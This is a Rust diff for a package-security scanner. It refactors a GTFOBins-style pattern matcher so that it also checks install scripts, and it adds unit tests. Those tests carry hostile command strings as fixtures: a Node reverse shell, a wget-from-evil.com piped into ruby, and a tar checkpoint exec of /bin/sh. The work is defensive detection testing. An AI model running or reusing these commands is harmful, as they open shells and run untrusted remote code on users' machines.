@@ -8,32 +8,45 @@ pub struct GtfobinsAnalysis;
 
 impl Feature for GtfobinsAnalysis {
     fn analyze(&self, ctx: &PackageContext) -> Vec<Signal> {
-        let Some(ref content) = ctx.pkgbuild_content else {
-            return Vec::new();
-        };
-
-        let compiled = patterns::compiled_patterns();
         let mut signals = Vec::new();
 
-        for pat in compiled {
-            if pat.regex.is_match(content) {
-                let matched_line = content
-                    .lines()
-                    .find(|line| pat.regex.is_match(line))
-                    .map(|line| line.trim().to_string());
-                signals.push(Signal {
-                    id: pat.id.clone(),
-                    category: SignalCategory::Pkgbuild,
-                    points: pat.points,
-                    description: pat.description.clone(),
-                    is_override_gate: pat.override_gate,
-                    matched_line,
-                });
-            }
+        if let Some(ref content) = ctx.pkgbuild_content {
+            signals.extend(match_patterns(content, "", ""));
+        }
+        if let Some(ref content) = ctx.install_script_content {
+            signals.extend(match_patterns(content, "IS-", "(in install script)"));
         }
 
         signals
     }
+}
+
+fn match_patterns(content: &str, id_prefix: &str, desc_suffix: &str) -> Vec<Signal> {
+    let compiled = patterns::compiled_patterns();
+    let mut signals = Vec::new();
+
+    for pat in compiled {
+        if pat.regex.is_match(content) {
+            let matched_line = content
+                .lines()
+                .find(|line| pat.regex.is_match(line))
+                .map(|line| line.trim().to_string());
+            signals.push(Signal {
+                id: format!("{}{}", id_prefix, pat.id),
+                category: SignalCategory::Pkgbuild,
+                points: pat.points,
+                description: if desc_suffix.is_empty() {
+                    pat.description.clone()
+                } else {
+                    format!("{} {}", pat.description, desc_suffix)
+                },
+                is_override_gate: pat.override_gate,
+                matched_line,
+            });
+        }
+    }
+
+    signals
 }
 
 #[cfg(test)]
@@ -904,5 +917,44 @@ build() {
     fn install_suid_2755_detected() {
         let ids = analyze("install -m2755 evil /usr/bin/evil");
         assert!(has(&ids, "G-INSTALL-SUID"), "got: {ids:?}");
+    }
+
+    // --- Install script analysis ---
+
+    fn analyze_install(content: &str) -> Vec<String> {
+        let ctx = PackageContext {
+            name: "test-pkg".into(),
+            metadata: None,
+            pkgbuild_content: None,
+            install_script_content: Some(content.into()),
+            prior_pkgbuild_content: None,
+            git_log: vec![],
+            maintainer_packages: vec![],
+        };
+        GtfobinsAnalysis.analyze(&ctx).iter().map(|s| s.id.clone()).collect()
+    }
+
+    #[test]
+    fn install_script_revshell_node() {
+        let ids = analyze_install("node -e 'var net = require(\"net\"); var c = new net.Socket(); c.connect(4444, \"10.0.0.1\")'");
+        assert!(has(&ids, "IS-G-REVSHELL-NODE"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_script_pipe_ruby() {
+        let ids = analyze_install("wget -qO- http://evil.com/x.rb | ruby");
+        assert!(has(&ids, "IS-G-PIPE-RUBY"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_script_tar_checkpoint() {
+        let ids = analyze_install("tar czf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh");
+        assert!(has(&ids, "IS-G-TAR-CHECKPOINT"), "got: {ids:?}");
+    }
+
+    #[test]
+    fn install_script_benign_no_signals() {
+        let ids = analyze_install("post_install() {\n    echo 'Done'\n}");
+        assert!(ids.is_empty(), "benign install script should trigger no signals, got: {ids:?}");
     }
 }
